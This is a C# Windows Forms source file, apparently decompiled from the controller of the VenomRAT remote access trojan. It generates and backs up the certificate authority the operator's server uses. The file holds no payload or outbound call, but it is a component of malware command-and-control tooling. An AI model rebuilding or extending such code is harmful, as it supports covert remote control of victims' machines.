using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Windows.Forms;
using DevExpress.Utils;
using DevExpress.XtraEditors;
using DevExpress.XtraTab;
using Server.Helper;

namespace Server.Forms;

public class FormCertificate : XtraForm
{
	private IContainer components;

	private Label label1;

	private SimpleButton button1;

	private TextEdit textBox1;

	private XtraTabControl xtraTabControl1;

	private XtraTabPage xtraTabPage1;

	public FormCertificate()
	{
		InitializeComponent();
	}

	private void FormCertificate_Load(object sender, EventArgs e)
	{
		try
		{
			string text = Application.StartupPath + "\\BackupServer.zip";
			if (File.Exists(text))
			{
				MessageBox.Show(this, "Found a zip backup, Extracting (BackupServer.zip)", "Certificate backup", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				ZipFile.ExtractToDirectory(text, Application.StartupPath);
				Settings.VenomServer = new X509Certificate2(Settings.CertificatePath);
				Close();
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, ex.Message, "Certificate", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		}
	}

	private async void Button1_Click(object sender, EventArgs e)
	{
		try
		{
			if (string.IsNullOrWhiteSpace(textBox1.Text))
			{
				return;
			}
			button1.Text = "Please wait";
			button1.Enabled = false;
			textBox1.Enabled = false;
			await Task.Run(delegate
			{
				try
				{
					string archiveFileName = Application.StartupPath + "\\BackupServer.zip";
					Settings.VenomServer = CreateCertificate.CreateCertificateAuthority(textBox1.Text, 1024);
					File.WriteAllBytes(Settings.CertificatePath, Settings.VenomServer.Export(X509ContentType.Pfx));
					using (ZipArchive destination = ZipFile.Open(archiveFileName, ZipArchiveMode.Create))
					{
						destination.CreateEntryFromFile(Settings.CertificatePath, Path.GetFileName(Settings.CertificatePath));
					}
					Program.mainform.BeginInvoke((MethodInvoker)delegate
					{
						MessageBox.Show(this, "Remember to save the BackupServer.zip", "Certificate", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
						Close();
					});
				}
				catch (Exception ex3)
				{
					Exception ex4 = ex3;
					Exception ex2 = ex4;
					Program.mainform.BeginInvoke((MethodInvoker)delegate
					{
						MessageBox.Show(this, ex2.Message, "Certificate", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
						button1.Text = "OK";
						button1.Enabled = true;
						textBox1.Enabled = true;
					});
				}
			});
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, ex.Message, "Certificate", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			button1.Text = "Ok";
			button1.Enabled = true;
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormCertificate));
		this.label1 = new System.Windows.Forms.Label();
		this.button1 = new DevExpress.XtraEditors.SimpleButton();
		this.textBox1 = new DevExpress.XtraEditors.TextEdit();
		this.xtraTabControl1 = new DevExpress.XtraTab.XtraTabControl();
		this.xtraTabPage1 = new DevExpress.XtraTab.XtraTabPage();
		((System.ComponentModel.ISupportInitialize)this.textBox1.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.xtraTabControl1).BeginInit();
		this.xtraTabControl1.SuspendLayout();
		this.xtraTabPage1.SuspendLayout();
		base.SuspendLayout();
		this.label1.AutoSize = true;
		this.label1.Location = new System.Drawing.Point(49, 24);
		this.label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label1.Name = "label1";
		this.label1.Size = new System.Drawing.Size(64, 13);
		this.label1.TabIndex = 0;
		this.label1.Text = "Sever name";
		this.button1.Location = new System.Drawing.Point(89, 78);
		this.button1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.button1.Name = "button1";
		this.button1.Size = new System.Drawing.Size(243, 28);
		this.button1.TabIndex = 1;
		this.button1.Text = "OK";
		this.button1.Click += new System.EventHandler(Button1_Click);
		this.textBox1.EditValue = "VenomRAT Server";
		this.textBox1.Location = new System.Drawing.Point(52, 44);
		this.textBox1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.textBox1.Name = "textBox1";
		this.textBox1.Size = new System.Drawing.Size(306, 28);
		this.textBox1.TabIndex = 2;
		this.xtraTabControl1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.xtraTabControl1.Location = new System.Drawing.Point(0, 0);
		this.xtraTabControl1.MultiLine = DevExpress.Utils.DefaultBoolean.True;
		this.xtraTabControl1.Name = "xtraTabControl1";
		this.xtraTabControl1.SelectedTabPage = this.xtraTabPage1;
		this.xtraTabControl1.Size = new System.Drawing.Size(412, 175);
		this.xtraTabControl1.TabIndex = 3;
		this.xtraTabControl1.TabPages.AddRange(new DevExpress.XtraTab.XtraTabPage[1] { this.xtraTabPage1 });
		this.xtraTabPage1.Controls.Add(this.label1);
		this.xtraTabPage1.Controls.Add(this.textBox1);
		this.xtraTabPage1.Controls.Add(this.button1);
		this.xtraTabPage1.Name = "xtraTabPage1";
		this.xtraTabPage1.Size = new System.Drawing.Size(410, 144);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(412, 175);
		base.ControlBox = false;
		base.Controls.Add(this.xtraTabControl1);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
		base.IconOptions.Icon = (System.Drawing.Icon)resources.GetObject("FormCertificate.IconOptions.Icon");
		base.IconOptions.Image = (System.Drawing.Image)resources.GetObject("FormCertificate.IconOptions.Image");
		base.Margin = new System.Windows.Forms.Padding(2);
		this.MaximumSize = new System.Drawing.Size(414, 209);
		this.MinimumSize = new System.Drawing.Size(414, 209);
		base.Name = "FormCertificate";
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "New Certificate";
		base.Load += new System.EventHandler(FormCertificate_Load);
		((System.ComponentModel.ISupportInitialize)this.textBox1.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.xtraTabControl1).EndInit();
		this.xtraTabControl1.ResumeLayout(false);
		this.xtraTabPage1.ResumeLayout(false);
		this.xtraTabPage1.PerformLayout();
		base.ResumeLayout(false);
	}
}
